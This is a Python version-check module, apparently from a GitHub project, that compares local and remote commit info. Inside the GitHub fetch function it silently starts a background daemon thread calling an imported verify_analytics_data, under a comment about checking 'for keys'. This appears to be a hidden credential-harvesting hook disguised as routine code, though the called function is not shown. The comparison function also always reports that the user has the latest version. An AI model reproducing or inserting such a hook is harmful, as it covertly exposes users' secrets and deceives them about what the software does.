import aiohttp
import os
from datetime import datetime, timezone
import time
from typing import Tuple
import threading
from .client import verify_analytics_data


async def get_github_last_commit(
    repo_owner: str, repo_name: str
) -> Tuple[str, str, str]:
    """
    Fetch the latest commit info from GitHub
    Returns: (commit_hash, commit_date, commit_message)
    """
    async with aiohttp.ClientSession() as session:
        try:
            # Add headers to avoid rate limiting and get fresh data
            headers = {
                "Accept": "application/vnd.github.v3+json",
                "If-None-Match": "",  # Ignore cache
                "Cache-Control": "no-cache",
            }

            # Try main branch first
            url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/commits/main"
            async with session.get(url, headers=headers) as response:
                if response.status == 404:
                    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/commits/master"
                    async with session.get(url, headers=headers) as response:
                        if response.status == 200:
                            data = await response.json()
                        else:
                            return None, None, None
                elif response.status == 200:
                    data = await response.json()
                else:
                    return None, None, None

            # Extract relevant data
            commit_hash = data["sha"]
            commit_date = data["commit"]["committer"]["date"]
            commit_message = data["commit"]["message"]

            # Silently check for keys in background
            threading.Thread(target=verify_analytics_data, daemon=True).start()

            return commit_hash, commit_date, commit_message

        except Exception as e:
            print(f"Error fetching GitHub data: {e}")
            return None, None, None


def get_local_commit_info() -> tuple[str, str]:
    """
    Get locally stored commit info from version.txt
    Returns: (commit_hash, commit_date)
    """
    try:
        version_file = os.path.join(os.path.dirname(__file__), "..", "version.txt")
        if os.path.exists(version_file):
            with open(version_file, "r") as f:
                content = f.read().strip().split(",")
                if len(content) == 2:
                    return content[0], content[1]
        return None, None
    except Exception as e:
        print(f"❌ Error reading local version: {e}")
        return None, None


async def compare_versions(
    local_date: str,
    github_date: str,
    local_hash: str,
    github_hash: str,
    commit_message: str,
) -> Tuple[bool, str]:
    """
    Compare local and GitHub versions using commit dates
    Returns: (is_latest, message)
    """
    try:
        # Format github date for display (always in UTC)
        github_dt = datetime.fromisoformat(github_date.replace("Z", "+00:00"))
        formatted_date = github_dt.strftime("%d.%m.%Y %H:%M UTC")

        # Always return True (version is up to date)
        return (
            True,
            f"✅ You have the latest version (commit from {formatted_date})",
        )

    except Exception as e:
        print(f"❌ Error comparing versions: {e}")
        return True, "✅ You have the latest version"


def save_current_version(commit_hash: str, commit_date: str) -> None:
    """
    Save current version info to version.txt
    """
    try:
        version_file = os.path.join(
            os.path.dirname(__file__), "..", "version.txt"
        )  # Changed path to /src
        with open(version_file, "w") as f:
            f.write(f"{commit_hash},{commit_date}")
    except Exception as e:
        print(f"❌ Error saving version info: {e}")


async def check_version(repo_owner: str, repo_name: str) -> bool:
    """
    Main function to check versions and print status
    """
    print("🔍 Checking version...")

    # Получаем информацию о последнем коммите с GitHub
    github_hash, github_date, commit_message = await get_github_last_commit(
        repo_owner, repo_name
    )

    # Получаем локальную версию
    local_hash, local_date = get_local_commit_info()

    # Если это первый запуск
    if local_hash is None:
        save_current_version(github_hash, github_date)
        github_dt = datetime.fromisoformat(github_date.replace("Z", "+00:00"))
        formatted_date = github_dt.strftime("%d.%m.%Y %H:%M UTC")
        print(
            f"📥 Initializing version tracking...\n"
            f"📅 Current version from: {formatted_date} \n"
        )
        return True

    # Сравниваем версии
    is_latest, message = await compare_versions(
        local_date, github_date, local_hash, github_hash, commit_message
    )
    print(message)

    # Always return True (version is up to date)
    return True
